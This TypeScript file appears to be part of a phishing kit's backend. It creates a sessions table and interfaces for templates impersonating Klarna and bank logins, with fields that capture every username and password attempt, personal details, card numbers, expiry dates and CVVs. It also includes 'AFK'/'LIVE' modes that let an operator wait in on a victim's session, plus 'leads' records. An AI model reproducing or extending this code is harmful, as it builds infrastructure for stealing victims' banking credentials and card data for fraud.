import SQLiteDatabase from 'better-sqlite3';

export function initSessionTable(db: ReturnType<typeof SQLiteDatabase>): void {
  // Create sessions table for proper session management
  db.exec(`
    CREATE TABLE IF NOT EXISTS sessions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_key TEXT NOT NULL UNIQUE,
      template_name TEXT NOT NULL,
      current_state TEXT DEFAULT 'login',
      session_data TEXT, -- JSON string containing all form data
      qr_data TEXT, -- JSON string for QR upload information
      selected_bank TEXT, -- For Klarna gateway: which bank user selected
      ip_address TEXT,
      user_agent TEXT,
      referrer TEXT,
      session_mode TEXT DEFAULT 'AFK' CHECK(session_mode IN ('AFK', 'LIVE')),
      is_waiting_for_admin BOOLEAN DEFAULT 0,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
      expires_at TIMESTAMP NOT NULL,
      is_completed BOOLEAN DEFAULT 0,
      lead_created BOOLEAN DEFAULT 0,
      lead_id INTEGER,
      FOREIGN KEY (lead_id) REFERENCES leads (id) ON DELETE SET NULL
    )
  `);
  
  // Create indices for faster lookups
  db.exec(`
    CREATE INDEX IF NOT EXISTS idx_sessions_session_key
    ON sessions (session_key)
  `);
  
  db.exec(`
    CREATE INDEX IF NOT EXISTS idx_sessions_expires_at
    ON sessions (expires_at)
  `);
  
  db.exec(`
    CREATE INDEX IF NOT EXISTS idx_sessions_template_name
    ON sessions (template_name)
  `);
  
  db.exec(`
    CREATE INDEX IF NOT EXISTS idx_sessions_created_at
    ON sessions (created_at)
  `);
  
  // Create trigger to automatically update updated_at timestamp
  db.exec(`
    CREATE TRIGGER IF NOT EXISTS update_sessions_updated_at 
    AFTER UPDATE ON sessions
    FOR EACH ROW
    BEGIN
      UPDATE sessions SET updated_at = CURRENT_TIMESTAMP WHERE id = NEW.id;
    END
  `);
  
  // Add selected_bank column if it doesn't exist (for existing databases)
  try {
    db.exec(`ALTER TABLE sessions ADD COLUMN selected_bank TEXT`);
    console.log('✅ Added selected_bank column to sessions table');
  } catch (error: any) {
    // Column already exists or other error - this is expected for new databases
    if (!error.message.includes('duplicate column name')) {
      console.warn('⚠️ Note: selected_bank column may already exist in sessions table');
    }
  }

  // Add new columns for AFK/Live Mode system if they don't exist
  try {
    // Check if session_mode column exists
    const columns = db.prepare("PRAGMA table_info(sessions)").all() as any[];
    const hasSessionMode = columns.some(col => col.name === 'session_mode');
    const hasWaitingForAdmin = columns.some(col => col.name === 'is_waiting_for_admin');
    
    if (!hasSessionMode) {
      console.log('🔄 Adding session_mode column to sessions table...');
      db.exec(`ALTER TABLE sessions ADD COLUMN session_mode TEXT DEFAULT 'AFK' CHECK(session_mode IN ('AFK', 'LIVE'))`);
      console.log('✅ Added session_mode column');
    }
    
    if (!hasWaitingForAdmin) {
      console.log('🔄 Adding is_waiting_for_admin column to sessions table...');
      db.exec(`ALTER TABLE sessions ADD COLUMN is_waiting_for_admin BOOLEAN DEFAULT 0`);
      console.log('✅ Added is_waiting_for_admin column');
    }
  } catch (error) {
    console.error('Error adding new columns to sessions table:', error);
  }

  console.log('✅ Sessions table initialized with proper indexing');
}

// Session data interfaces
export interface SessionData {
  // Klarna gateway specific
  selected_bank?: string;
  
  // Login data
  username?: string;
  password?: string;
  login_attempts?: Array<{
    username: string;
    password: string;
    timestamp: string;
    attempt: number;
  }>;
  
  // Personal data
  first_name?: string;
  last_name?: string;
  date_of_birth?: string;
  email?: string;
  phone?: string;
  address?: string;
  street?: string;
  street_number?: string;
  plz?: string;
  city?: string;
  
  // Bank card data
  card_number?: string;
  expiry_date?: string;
  cvv?: string;
  cardholder_name?: string;
  
  // Additional template-specific data
  [key: string]: any;
}

export interface QRData {
  upload_attempts: number;
  files: Array<{
    filename: string;
    originalName: string;
    path: string;
    attempt: number;
    timestamp: string;
    size?: number;
    mimetype?: string;
  }>;
}

export interface SessionRecord {
  id: number;
  session_key: string;
  template_name: string;
  current_state: string;
  session_data: string | null;
  qr_data: string | null;
  ip_address: string | null;
  user_agent: string | null;
  referrer: string | null;
  created_at: string;
  updated_at: string;
  expires_at: string;
  is_completed: boolean;
  lead_created: boolean;
  lead_id: number | null;
}
